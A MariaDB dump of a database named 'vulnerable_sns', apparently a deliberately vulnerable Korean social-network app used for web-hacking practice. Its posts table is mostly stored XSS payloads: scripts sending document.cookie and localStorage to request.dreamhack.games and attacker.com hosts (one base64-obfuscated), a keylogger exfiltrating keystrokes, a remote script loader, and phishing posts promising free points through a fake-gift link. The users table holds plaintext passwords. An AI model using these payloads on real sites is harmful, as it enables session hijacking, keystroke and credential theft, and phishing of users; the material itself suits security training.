/*M!999999\- enable the sandbox mode */ 
-- MariaDB dump 10.19  Distrib 10.5.29-MariaDB, for Linux (x86_64)
--
-- Host: localhost    Database: vulnerable_sns
-- ------------------------------------------------------
-- Server version	10.5.29-MariaDB

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `gifts`
--

DROP TABLE IF EXISTS `gifts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `gifts` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `sender_id` int(11) NOT NULL,
  `receiver_id` int(11) NOT NULL,
  `gift_type` varchar(50) NOT NULL,
  `points` int(11) NOT NULL,
  `message` text DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `sender_id` (`sender_id`),
  KEY `receiver_id` (`receiver_id`),
  CONSTRAINT `gifts_ibfk_1` FOREIGN KEY (`sender_id`) REFERENCES `users` (`id`),
  CONSTRAINT `gifts_ibfk_2` FOREIGN KEY (`receiver_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `gifts`
--

LOCK TABLES `gifts` WRITE;
/*!40000 ALTER TABLE `gifts` DISABLE KEYS */;
INSERT INTO `gifts` VALUES (1,1,1,'coffee',100,'','2025-11-10 02:12:31');
/*!40000 ALTER TABLE `gifts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `post_likes`
--

DROP TABLE IF EXISTS `post_likes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `post_likes` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `post_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  UNIQUE KEY `post_id` (`post_id`,`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `post_likes`
--

LOCK TABLES `post_likes` WRITE;
/*!40000 ALTER TABLE `post_likes` DISABLE KEYS */;
/*!40000 ALTER TABLE `post_likes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `posts`
--

DROP TABLE IF EXISTS `posts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `posts` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=203 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `posts`
--

LOCK TABLES `posts` WRITE;
/*!40000 ALTER TABLE `posts` DISABLE KEYS */;
INSERT INTO `posts` VALUES (168,1,'','1','2025-11-10 03:10:49'),(169,1,'','<script>document.location=\"https://ttfujkr.request.dreamhack.games?c=\"+document.cookie</script>','2025-11-10 03:20:45'),(170,1,'','<script>eval(atob(\"ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9hdHRhY2tlci5jb20vc3RlYWw/Yz0iK2RvY3VtZW50LmNvb2tpZQ==\"))</script>','2025-11-10 03:20:47'),(171,1,'','<img src=x onerror=\"this.src=\'https://ttfujkr.request.dreamhack.games?c=\'+document.cookie\">','2025-11-10 03:20:48'),(172,1,'','<svg onload=\"fetch(\'https://ttfujkr.request.dreamhack.games\',{method:\'POST\',body:document.cookie})\">','2025-11-10 03:20:49'),(173,1,'','<div onmouseover=\"new Image().src=\'https://ttfujkr.request.dreamhack.games?c=\'+escape(document.cookie)\">마우스를 올려보세요!</div>','2025-11-10 03:20:51'),(174,1,'','<script>var x=new XMLHttpRequest();x.open(\"POST\",\"https://ttfujkr.request.dreamhack.games\",true);x.send(\"c=\"+document.cookie)</script>','2025-11-10 03:20:54'),(175,1,'','<script>fetch(\"https://ttfujkr.request.dreamhack.games\",{method:\"POST\",body:JSON.stringify({c:document.cookie,l:localStorage})})</script>','2025-11-10 03:20:55'),(176,1,'','<script>var k=\"\";document.onkeypress=function(e){k+=e.key;if(k.length>10){new Image().src=\"https://ttfujkr.request.dreamhack.games?k=\"+btoa(k);k=\"\"}}</script>','2025-11-10 03:20:57'),(177,1,'','<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">','2025-11-10 03:21:00'),(178,1,'','<ScRiPt>document.location=\"https://ttfujkr.request.dreamhack.games/c?\"+document.cookie</ScRiPt>','2025-11-10 03:21:01'),(179,1,'','<script src=\"https://ttfujkr.request.dreamhack.games/blind.js\"></script>','2025-11-10 03:21:04'),(180,1,'','&lt;script&gt;alert(document.cookie)&lt;/script&gt;','2025-11-10 03:21:06'),(181,1,'','<ScRiPt>alert(document.cookie)</sCripT>','2025-11-10 03:21:07'),(182,1,'','<body onload=\"alert(document.cookie)\">','2025-11-10 03:21:09'),(183,1,'','<a href=\"javascript:alert(document.cookie)\">Click me</a>','2025-11-10 03:21:11'),(184,1,'','<iframe src=\"data:text/html,<script>alert(parent.document.cookie)</script>\">','2025-11-10 03:21:14'),(185,1,'','🎁 특별 이벤트! 🎁\n\n무료 10,000 포인트 받기!\n지금 클릭하세요: https://ttfujkr.request.dreamhack.games/fake-gift\n\n선착순 100명! 서두르세요!','2025-11-10 03:21:17'),(186,1,'','<script>alert(\"XSS\")</script>','2025-11-10 03:24:15'),(187,1,'','<script>alert(\"XSS\")</script>','2025-11-10 03:24:15'),(188,1,'','안녕하세요! 좋은 하루 되세요 😊','2025-11-10 03:24:24'),(189,1,'','<script>alert(\"XSS\")</script>','2025-11-10 03:30:04'),(190,1,'','<script>alert(\"XSS\")</script>','2025-11-10 03:30:04'),(191,1,'','안녕하세요! 좋은 하루 되세요 😊','2025-11-10 03:30:12'),(192,1,'','<sCriPt>colose.log(\'test\')</sCRiPT>','2025-11-10 03:30:51'),(193,1,'','<sCRipT>var cookieData = document.cookie;var i = new Image();i.src = \"https://gkqajvx.request.dreamhack.games?cookie=\"+cookieData;</sCriPt>','2025-11-10 03:33:19'),(194,1,'','<script>alert(\"XSS\")</script>','2025-11-10 03:33:41'),(195,1,'','<script>alert(\"XSS\")</script>','2025-11-10 03:33:41'),(196,1,'','특별 이벤트! 무료 10,000 포인트 받기! 지금 클릭하세요: http://13.158.67.78:5000/fake-gift?t=1762745626 선착순 100명! 서두르세요!','2025-11-10 03:33:49'),(197,1,'','<script>alert(\"XSS\")</script>','2025-11-10 03:42:49'),(198,1,'','<script>alert(\"XSS\")</script>','2025-11-10 03:42:49'),(199,1,'','특별 이벤트! 무료 10,000 포인트 받기! 지금 클릭하세요: http://13.158.67.78:5000/fake-gift?t=1762746175 선착순 100명! 서두르세요!','2025-11-10 03:42:59'),(200,1,'','<script>alert(\"XSS\")</script>','2025-11-10 03:48:21'),(201,1,'','<script>alert(\"XSS\")</script>','2025-11-10 03:48:21'),(202,1,'','특별 이벤트! 무료 10,000 포인트 받기! 지금 클릭하세요: http://13.158.67.78:5000/fake-gift?t=1762746507 선착순 100명! 서두르세요!','2025-11-10 03:48:30');
/*!40000 ALTER TABLE `posts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `udf_temp`
--

DROP TABLE IF EXISTS `udf_temp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `udf_temp` (
  `line` blob DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `udf_temp`
--

LOCK TABLES `udf_temp` WRITE;
/*!40000 ALTER TABLE `udf_temp` DISABLE KEYS */;
INSERT INTO `udf_temp` VALUES (NULL);
/*!40000 ALTER TABLE `udf_temp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `udf_test`
--

DROP TABLE IF EXISTS `udf_test`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `udf_test` (
  `line` blob DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `udf_test`
--

LOCK TABLES `udf_test` WRITE;
/*!40000 ALTER TABLE `udf_test` DISABLE KEYS */;
INSERT INTO `udf_test` VALUES (NULL);
/*!40000 ALTER TABLE `udf_test` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `full_name` varchar(100) DEFAULT '',
  `email` varchar(255) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `points` int(11) NOT NULL DEFAULT 0,
  `profile_image` varchar(255) DEFAULT NULL,
  `bio` text DEFAULT '',
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'admin','admin123','관리자','admin@example.com','2025-11-10 00:43:54',999999,NULL,''),(10,'alice','alice2024','앨리스','alice@example.com','2025-11-10 01:10:38',1200,NULL,''),(11,'bob','bobby123','밥','bob@example.com','2025-11-10 01:10:44',1200,NULL,''),(12,'testuser9986','$2y$10$X2Rq0/SMDjiuNWIvpbudq.IFlkItmb8TDhKPhuhgMrUPzAUgZPtju','Test User 9986','test9986@test.com','2025-11-10 01:16:05',100,NULL,'');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2025-11-10 12:49:16
